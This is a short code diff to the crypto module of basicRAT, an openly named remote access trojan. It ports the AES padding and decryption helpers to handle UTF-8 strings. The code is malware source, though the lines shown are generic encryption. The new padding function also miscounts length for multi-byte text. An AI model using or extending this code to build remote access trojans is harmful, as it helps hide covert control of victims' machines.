@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 #
 # basicRAT crypto module
 # https://github.com/vesche/basicRAT
@@ -12,7 +14,7 @@ from Crypto.Util.number import bytes_to_long, long_to_bytes
 
 
 def pad(s):
-    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
+    return bytes(s, 'utf-8') + b'\0' * (AES.block_size - len(s) % AES.block_size)
 
 
 def encrypt(plaintext, key):
@@ -26,7 +28,7 @@ def decrypt(ciphertext, key):
     iv = ciphertext[:AES.block_size]
     cipher = AES.new(key, AES.MODE_CBC, iv)
     plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext.rstrip(b'\0')
+    return plaintext.rstrip(b'\0').decode('utf-8')
 
 
 # Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631
